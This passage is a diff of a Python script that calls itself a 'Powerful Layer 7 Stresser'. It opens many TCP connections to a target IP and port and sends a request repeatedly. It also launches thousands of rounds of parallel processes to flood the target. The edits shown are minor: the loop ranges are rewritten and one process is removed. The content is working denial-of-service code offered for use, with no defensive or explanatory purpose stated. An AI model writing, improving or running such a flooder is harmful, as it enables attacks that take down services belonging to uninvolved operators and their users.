@@ -40,7 +40,7 @@ def attack(): # The root of the attack
       atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       atk.connect((ip, port))
       # Attack processing starts here
-      for y in range(100):
+      for y in range(0, 100):
           atk.send(str.encode(request))
     except socket.error:
       time.sleep(.1)
@@ -49,22 +49,19 @@ def attack(): # The root of the attack
 
 # Multiprocessing to make the stresser run on more processes
 def sendattack():
-  for i in range(5000): # Number of Processes
+  for i in range(0, 5000): # Number of Processes
     mp = multiprocessing.Process(target=attack)
     mp2 = multiprocessing.Process(target=attack)
     mp3 = multiprocessing.Process(target=attack)
     mp4 = multiprocessing.Process(target=attack)
-    mp5 = multiprocessing.Process(target=attack)
     mp.setDaemon = False
     mp2.setDaemon = False
     mp3.setDaemon = False
     mp4.setDaemon = False
-    mp5.setDaemon = False
     mp.start()
     mp2.start()
     mp3.start()
     mp4.start()
-    mp5.start()
 
 sendattack() # send attack
 # End of Powerful Layer 7 Stresser.
